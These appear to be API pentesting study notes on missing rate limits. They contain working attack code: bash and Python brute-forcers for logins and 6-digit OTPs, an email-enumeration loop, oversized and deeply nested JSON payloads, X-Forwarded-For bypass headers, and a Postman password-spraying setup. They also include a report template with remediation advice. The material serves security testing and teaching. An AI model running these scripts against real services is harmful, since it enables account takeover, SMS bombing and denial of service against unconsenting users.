# API Rate Limiting: How Attackers Abuse Unlimited Endpoints
## Complete Study Notes — API Pentesting Day 11

> **Series:** 30-Day API Pentesting  
> **Day:** 11 — Week 2: OWASP API Top 10  
> **OWASP Category:** API4:2023 — Unrestricted Resource Consumption

---

## 🧠 Core Concept — Why This Vulnerability Exists

### What is Unrestricted Resource Consumption?

When an API doesn't limit **how many times** a client can call an endpoint, or **how large** a request can be, attackers can:

1. **Brute force** credentials by trying thousands of passwords
2. **Bypass OTP** by trying all 1 million 6-digit combinations
3. **DoS the server** by sending huge payloads or complex queries
4. **Flood victims** with spam emails or SMS by calling notification endpoints endlessly
5. **Dump the database** by setting `?limit=999999` on paginated endpoints

### Why Developers Miss This

```
Developer mindset:  "Our users won't send 10,000 requests. That's fine."
Attacker mindset:   "I'm not your user. I'm going to send exactly 10,000 requests."

The fix is simple:  Add rate limiting.
The problem is:     Developers forget. Or add it to ONE endpoint but not all.
Your job:           Find the endpoints they forgot.
```

### The 429 Status Code

```
HTTP 429 Too Many Requests = rate limiting is WORKING
No 429 after 100 requests  = rate limiting is MISSING = your bug
```

---

## 📖 Understanding the Attack Types

### Attack Type 1: Credential Brute Force

**Scenario:** Login endpoint has no rate limit.

```
You want: admin@target.com's password
You have: rockyou.txt (14 million passwords)
Time needed without rate limit: Minutes (100 req/sec = 6000/min)
Time needed WITH rate limit (5 req/min): 2.6 million minutes = never
```

**What you're looking for:**
- No 429 response after 20-50 requests
- No account lockout after wrong password attempts
- No CAPTCHA enforcement
- Response time doesn't increase (no throttling)

### Attack Type 2: OTP/PIN Brute Force

**The math:**
```
6-digit OTP = 000000 to 999999 = 1,000,000 combinations
At 100 req/sec with no rate limit = 2.7 hours to try all
At 10 req/sec = 27 hours (still feasible)
With rate limit of 3 attempts = impossible to brute force
```

### Attack Type 3: Resource Exhaustion

**Server kills itself when you send:**
```
- 100MB JSON payload → server allocates 100MB RAM to parse it
- 1000-level deep JSON nesting → parser recursion overflow
- Regex with catastrophic backtracking → CPU spike to 100%
- GraphQL query with 50 levels of nesting → exponential DB queries
- ZIP bomb in file upload → 1KB file decompresses to 10GB
```

---

## 🔍 Complete Testing Methodology

### Step 1: Map All Sensitive Endpoints

```bash
# These MUST be tested for rate limiting
ENDPOINTS=(
  "/auth/login"
  "/auth/register"  
  "/auth/forgot-password"
  "/auth/reset-password"
  "/auth/verify-otp"
  "/auth/verify-email"
  "/auth/resend-otp"
  "/auth/resend-verification"
  "/api/v1/users/search"
  "/api/v1/upload"
  "/api/v1/export"
  "/api/v1/share"
  "/api/v1/invite"
  "/api/v1/send-report"
)
```

### Step 2: Basic Rate Limit Test

```bash
#!/bin/bash
TARGET="https://api.target.com"
ENDPOINT="/api/v1/auth/login"
LIMIT_FOUND=false

echo "[*] Testing rate limit on $ENDPOINT"
echo "[*] Sending 100 requests..."

for i in $(seq 1 100); do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "$TARGET$ENDPOINT" \
        -H "Content-Type: application/json" \
        -d '{"email":"test@test.com","password":"wrongpass'$i'"}')
    
    echo "Request $i: HTTP $CODE"
    
    if [ "$CODE" = "429" ]; then
        echo "[+] Rate limit triggered at request $i!"
        LIMIT_FOUND=true
        break
    fi
done

if [ "$LIMIT_FOUND" = false ]; then
    echo "[!] VULNERABILITY: No rate limiting found on $ENDPOINT"
    echo "[!] 100 requests sent, 0 got HTTP 429"
fi
```

### Step 3: OTP Brute Force Test

```python
import requests
import time

TARGET = "https://api.target.com"
# Pre-requisite: trigger OTP for a test account first
HEADERS = {"Authorization": "Bearer YOUR_TOKEN"}

print("[*] Testing OTP rate limiting...")
for otp in range(0, 100):  # Test first 100 (expand to 1000000 if confirmed no limit)
    otp_str = str(otp).zfill(6)  # pad to 6 digits: 000001, 000002...
    
    resp = requests.post(
        f"{TARGET}/api/v1/auth/verify-otp",
        headers=HEADERS,
        json={"otp": otp_str}
    )
    
    print(f"OTP {otp_str}: HTTP {resp.status_code}")
    
    if resp.status_code == 200:
        print(f"[!!!] OTP FOUND: {otp_str}")
        break
    
    if resp.status_code == 429:
        print(f"[+] Rate limited at OTP attempt {otp}")
        break
    
    if resp.status_code == 401 and "locked" in resp.text.lower():
        print(f"[+] Account locked at attempt {otp}")
        break
    
    # Slow down slightly to avoid connection errors
    time.sleep(0.01)
```

### Step 4: Password Enumeration via Forgot-Password

```bash
# If no rate limit on /forgot-password:
# Valid email:   {"message": "Reset email sent"}  → 200
# Invalid email: {"error": "Email not found"}     → 404

# This lets you enumerate ALL valid emails!
while read email; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "$TARGET/api/v1/auth/forgot-password" \
        -d "{\"email\":\"$email\"}")
    
    [ "$CODE" = "200" ] && echo "VALID: $email"
done < emails.txt
```

### Step 5: Resource Exhaustion Testing

```bash
# Test 1: Large JSON body
python3 -c "
import json
payload = {'data': 'A' * (100 * 1024 * 1024)}  # 100MB
with open('/tmp/large.json', 'w') as f:
    json.dump(payload, f)
"
curl -X POST https://api.target.com/api/v1/data \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer TOKEN" \
    -d @/tmp/large.json \
    -w "\nHTTP: %{http_code}\nTime: %{time_total}s\n"

# Expected: 413 Payload Too Large
# Vulnerable: 200 OK or 500 Server Error

# Test 2: Deep JSON nesting (JSON bomb)
python3 -c "
depth = 1000
nested = 'null'
for i in range(depth):
    nested = '{\"a\":' + nested + '}'
print(nested[:200] + '...')
" | curl -X POST https://api.target.com/api/v1/process \
    -H "Content-Type: application/json" \
    -d @- \
    -w "\nHTTP: %{http_code}\n"

# Test 3: Pagination abuse
curl "https://api.target.com/api/v1/users?page=1&limit=999999" \
    -H "Authorization: Bearer TOKEN" \
    -w "\nHTTP: %{http_code}\nSize: %{size_download} bytes\n"

# Expected: 400 Bad Request (max limit enforced)
# Vulnerable: 200 OK with thousands of records
```

### Step 6: Rate Limit Bypass Techniques

```bash
# Bypass 1: IP rotation via X-Forwarded-For header
for ip in $(seq 1 255); do
    curl -s -o /dev/null -w "IP 1.2.3.$ip: %{http_code}\n" \
        -X POST "$TARGET/api/login" \
        -H "X-Forwarded-For: 1.2.3.$ip" \
        -H "X-Real-IP: 1.2.3.$ip" \
        -d '{"email":"admin@test.com","password":"attempt'$ip'"}'
done

# Other bypass headers to try:
# X-Client-IP: 1.2.3.4
# X-Remote-IP: 1.2.3.4
# X-Originating-IP: 1.2.3.4
# True-Client-IP: 1.2.3.4
# CF-Connecting-IP: 1.2.3.4

# Bypass 2: Distribute across endpoints/versions
# If /api/v3/login has rate limit, try:
# /api/v1/login
# /api/v2/login
# /api/login (no version)
# /login

# Bypass 3: Null byte / encoding tricks
# /auth/login%00
# /auth/login%20
# /auth/login.json
# /auth/login/

# Bypass 4: Case variation
# /Auth/Login
# /AUTH/LOGIN
# /api/Login
```

---

## 🎯 Specific Bug Scenarios

### Scenario 1: OTP Bypass → Account Takeover

```
1. Attacker knows victim's phone/email: victim@target.com
2. Trigger /forgot-password for victim → OTP sent to victim's phone
3. Hit /verify-otp with no rate limit
4. Brute force 000000 → 999999 (at 1000 req/sec = 16 minutes max)
5. OTP matched → set new password for victim → ATO
```

**Impact:** Critical — Account Takeover on any account

### Scenario 2: Login Brute Force

```
1. Find /api/login with no rate limit and no lockout
2. Load common passwords: rockyou.txt (14M passwords)
3. Send at max speed (100-1000 req/sec depending on server)
4. Monitor for 200 response vs 401
5. Cracked credentials → full account access
```

**Tip:** Target admin accounts first: `admin@target.com`, `info@target.com`

### Scenario 3: SMS/Email Bombing

```
1. Find /api/resend-otp with no rate limit
2. Provide victim's phone number
3. Send 1000 requests in a loop
4. Victim receives 1000 SMS messages
5. This is a nuisance attack AND costs the company money per SMS
```

**Impact:** Medium — Harassment + financial impact

### Scenario 4: Database Dump via Pagination

```
1. Find paginated endpoint: GET /api/users?page=1&limit=20
2. Test: GET /api/users?page=1&limit=9999999
3. If returns all users → full user database exposed in one request
4. Extract: emails, hashed passwords, names, addresses of all users
```

**Impact:** Critical — Mass PII exposure

---

## 📊 How to Report Rate Limit Bugs

### Severity Guide

| Finding | Severity | Why |
|---------|----------|-----|
| No rate limit on /login → brute force possible | High | Credentials at risk |
| No rate limit on /verify-otp → OTP bypass | Critical | Direct ATO path |
| No rate limit on /forgot-password | Medium | Email bomb + enumeration |
| No max limit on pagination (?limit=9999) | High | DB dump possible |
| Large payload accepted (>10MB) | Medium | Resource exhaustion |
| No SMS sending limit | Medium | Financial + harassment |

### Report Template

```
Title: No Rate Limiting on POST /api/v1/auth/verify-otp — OTP Brute Force Possible

Severity: Critical

Description:
The POST /api/v1/auth/verify-otp endpoint has no rate limiting. 
A 6-digit OTP has only 1,000,000 possible values. An attacker 
who knows a victim's phone number can trigger OTP generation, 
then brute force all 1,000,000 values to find the correct OTP 
and complete account takeover.

Steps to Reproduce:
1. Register account with victim@test.com
2. Trigger forgot-password flow → OTP sent
3. Run: for i in $(seq -w 0 999999); do
     curl -X POST /api/v1/auth/verify-otp \
       -d "{\"otp\":\"$i\"}" &
   done
4. At ~500 requests/second: OTP found in ~33 minutes average
5. Account fully compromised

Proof of Concept:
[Screenshot showing 1000 requests sent, all returning 401 without 
a single 429 response]

Impact:
Complete account takeover of ANY user on the platform. Attacker 
needs only the victim's phone number to initiate the attack.

Remediation:
- Limit OTP attempts to 3-5 per token
- Implement 15-30 minute timeout after 3 failed attempts
- Invalidate OTP after use and after timeout
- Add IP-based rate limiting as secondary control
```

---

## 🔧 Postman Collection Runner Setup

```javascript
// 1. Create request: POST /api/auth/login
// 2. Body: {"email":"admin@target.com","password":"{{password}}"}
// 3. Create data file passwords.csv:
//    password
//    admin123
//    password
//    Test1234!
//    ... (load from rockyou.txt)

// 4. Tests tab:
pm.test("Login Check", function() {
    if (pm.response.code === 200) {
        var data = pm.response.json();
        if (data.token || data.access_token) {
            console.log("PASSWORD FOUND: " + pm.iterationData.get("password"));
            console.log("Token: " + (data.token || data.access_token));
            postman.setNextRequest(null); // Stop collection
        }
    }
    if (pm.response.code === 429) {
        console.log("Rate limited at iteration: " + pm.info.iteration);
        postman.setNextRequest(null);
    }
});

// 5. Collection Runner:
//    → Data: passwords.csv
//    → Iterations: 10000
//    → Delay: 0ms
//    → Run!
```

---

## ✅ Final Checklist

```
☐  Test /auth/login — 100 requests, check for 429
☐  Test /auth/verify-otp — brute force test, check lockout
☐  Test /auth/forgot-password — 50 requests, check 429
☐  Test /auth/resend-otp and /auth/resend-verification
☐  Test pagination: ?limit=9999999 on any list endpoint
☐  Send 100MB JSON body to POST endpoints
☐  Test GraphQL depth limit: {a{a{a{a{a{a{a{b}}}}}}}}
☐  Try IP bypass: X-Forwarded-For with rotating IPs
☐  Test all API versions: v1, v2, v3 — old versions often miss limits
☐  Document exact request count + confirm no 429 for report
```

---

## 💡 Key Takeaways

1. **Test EVERY auth endpoint** — devs often add rate limit to /login but forget /verify-otp
2. **OTP brute force is Critical** — 6 digits = 1M attempts = very feasible
3. **Try different API versions** — v1 often has no rate limit even if v3 does
4. **IP spoofing headers** — X-Forwarded-For bypass works on many CDN/proxy setups
5. **Pagination without max limit** = easy database dump
6. **Always show proof in report** — screenshot showing 1000 requests, 0 HTTP 429s

> **Hunter mindset:** Rate limits are like speed bumps. Find the roads without them.

---

*30-Day API Pentesting Series — @cybermindspace — follow for more.*
